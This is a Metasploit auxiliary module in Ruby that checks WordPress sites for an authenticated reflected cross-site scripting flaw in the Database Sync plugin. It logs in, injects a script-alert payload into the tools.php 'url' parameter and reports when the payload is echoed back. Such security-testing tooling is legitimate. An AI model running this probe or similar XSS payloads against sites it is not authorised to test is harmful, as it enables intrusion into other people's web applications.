##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Database Sync XSS Scanner',
      'Description' => %q{
      This module attempts to exploit an Authenticated Cross-Site Scripting in
      Database Sync Plugin for WordPress, version 0.4 and likely prior in order
      if the instance is vulnerable.
      },
      'Author'      =>
        [
          'Morten Nørtoft, Kenneth Jepsen & Mikkel Vej', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['WPVDB', '8127'],
          ['URL', 'https://packetstormsecurity.com/files/132907/']
        ],
      'DisclosureDate' => 'Ago 04 2015'
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'A valid password', nil])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('database-sync', '0.5')
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as: #{user}")
      return
    end

    xss = "<script>alert(#{Rex::Text.rand_text_numeric(8)})</script>"

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_backend, 'tools.php'),
      'vars_get'  => {
        'page'    => 'dbs_options',
        'dbs_action'  => 'sync',
        'url'         => "#{xss}"
      },
      'cookie'    => cookie
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body.include?("#{xss}")
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the Database Sync 0.4 plugin for WordPress")
      p = store_local(
        'wp_databasesync.http',
        'text/html',
        res.body,
        "#{xss}"
      )
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
